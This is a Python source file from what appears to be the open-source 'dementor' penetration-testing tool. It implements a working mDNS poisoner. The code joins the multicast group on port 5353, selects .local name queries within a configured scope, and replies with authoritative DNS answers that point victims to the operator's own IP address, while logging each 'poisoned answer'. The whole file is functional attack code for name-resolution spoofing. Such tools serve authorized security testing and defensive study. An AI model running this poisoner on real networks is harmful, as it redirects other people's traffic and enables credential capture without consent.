# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import socket

from scapy.layers import dns
from rich import markup

from dementor.filters import ATTR_BLACKLIST, ATTR_WHITELIST, in_scope
from dementor.logger import ProtocolLogger
from dementor.servers import ThreadingUDPServer, BaseProtoHandler, ServerThread, add_mcast_membership
from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig

MDNS_IPV4_ADDR = "224.0.0.251"
MDNS_IPV6_ADDR = "ff02::fb"

QTYPES = {name: value for value, name in dns.dnsqtypes.items()}


def apply_config(session: SessionConfig) -> None:
    session.mdns_config = TomlConfig.build_config(MDNSConfig)


def create_server_threads(session: SessionConfig) -> list:
    if not session.mdns_config.enabled:
        return []

    return [ServerThread(session, MDNSServer)]


def normalized_name(host: str | bytes) -> str:
    if isinstance(host, (bytes, bytearray)):
        host = host.decode("utf-8", errors="replace")

    return str(host).strip().removesuffix(".")


class MDNSConfig(TomlConfig):
    _section_ = "mDNS"
    _fields_ = [
        A("enabled", "Dementor.mDNS", True),
        A("mdns_ttl", "TTL", 120),
        A("mdns_max_labels", "MaxLabels", 1),
        A("mdns_qtypes", "AllowedQueryTypes", [1, 28, 255]),  # A, AAAA, ANY
        ATTR_WHITELIST,
        ATTR_BLACKLIST,
    ]

    def set_mdns_qtypes(self, value: list):
        # REVISIT: maybe add error check here
        self.mdns_qtypes = [x if isinstance(x, int) else QTYPES[x] for x in value]


# MDNS / LLMNR Answer Packet
def build_dns_answer(req_id: int, question: dns.DNSQR, config: SessionConfig):
    answer = dns.DNSRR(
        rrname=question.qname,
        ttl=config.mdns_config.mdns_ttl or 120,  # default is two minutes
        cacheflush=False,  # TODO: maybe change in config
    )

    # we assume here that the local address is set
    if question.qtype == 28:  # AAAA
        answer.type = 28
        answer.rdata = config.ipv6
    else:  # A
        answer.type = 1
        answer.rdata = config.ipv4

    return dns.DNS(
        id=req_id,  # use request id from query
        aa=1,  # server is authority
        rd=0,  # do not query recursively
        qr=1,
        qd=[],  # questions
        ar=[],  # additional records
        an=[answer],
    )


class MDNSPoisoner(BaseProtoHandler):
    def proto_logger(self):
        return ProtocolLogger(
            extra={
                "protocol": "MDNS",
                "protocol_color": "deep_sky_blue1",
                "host": self.client_host,
                "port": self.client_port,
            }
        )

    def should_answer_request(self, question: dns.DNSQR) -> bool:
        # normally, the target hostname has only one node
        normalized_qname = normalized_name(question.qname)
        if normalized_qname.count(".") > self.config.mdns_config.mdns_max_labels:
            return False

        if question.qtype not in self.config.mdns_config.mdns_qtypes:  # A, AAAA, ANY
            return False

        # source host will be checked too
        source = self.client_host
        config = self.config.mdns_config
        return in_scope(normalized_qname, config) and in_scope(source, config)

    def handle_data(self, data: bytes, transport) -> None:
        packet = dns.DNS(data)
        if packet.qdcount > 0:
            # request sent by client
            for question in packet.qd:
                qname = question.qname.decode(errors="replace")
                qtype = dns.dnsqtypes.get(question.qtype)
                qclass = dns.dnsclasses.get(question.qclass)
                # only .local names are targets
                normalized_qname = normalized_name(question.qname)
                if not normalized_qname.endswith(".local"):
                    continue

                if self.should_answer_request(question):
                    name = markup.escape(normalized_name(qname))
                    self.logger.display(
                        f"Request for [i]{name}[/i] (class: {qclass}, type: {qtype})"
                    )
                    if self.config.analysis:
                        # Analyze-only mode
                        continue
                    self.send_poisoned_answer(packet, question, transport, name)
                # REVISIT: maybe log ignored requests
                # else:
                #     self.logger.display(
                #         f"[b]Ignoring[/b] request for [i]{normalized_name(qname)}[/i] (class: {qclass}, "
                #         f"type: {qtype})"
                #     )

    def send_poisoned_answer(
        self, req, question: dns.DNSQR, transport, name: str
    ) -> None:
        # check if we can send a response
        if question.qtype == 28 and not self.config.ipv6:
            self.logger.highlight(
                "Client requested AAAA record (IPv6) but local config does not "
                "specify IPv6 address. Ignoring..."
            )
            return

        if question.qtype == 1 and not self.config.ipv4:
            self.logger.highlight(
                "Client requested A record (IPv4) but local config does not "
                "specify IPv4 address. Ignoring..."
            )
            return

        # build response packet with our IP in answer RR
        response = build_dns_answer(req.id, question, self.config)
        transport.sendto(response.build(), self.client_address)
        self.logger.success(
            f"Sent poisoned answer to {self.client_host} for [i]{name}[/]"
        )


class MDNSServer(ThreadingUDPServer):
    default_port = 5353
    default_handler_class = MDNSPoisoner
    service_name = "mDNS"

    def server_bind(self) -> None:
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        add_mcast_membership(
            self.socket,
            self.config,
            group4=MDNS_IPV4_ADDR,
            group6=MDNS_IPV6_ADDR,
        )
        super().server_bind()
